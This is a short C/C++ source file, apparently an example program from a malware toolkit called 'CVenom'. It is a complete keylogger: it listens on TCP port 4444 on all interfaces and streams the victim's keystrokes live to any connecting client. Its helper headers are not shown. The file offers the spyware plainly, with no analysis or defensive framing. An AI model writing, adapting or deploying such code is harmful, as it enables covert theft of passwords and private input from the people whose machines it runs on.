#include "../CVenom.h"
#include "../NetworkTools.h"
#include "../KeyboardTools.h"

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	NetworkTools	Network;
	KeyboardTools	Keyboard;

	Network.TCPServer("*", 4444);
	Keyboard.LiveStreamKeystrokes(Network.Socket());

	cvexit(MALWARE_EXIT);
}
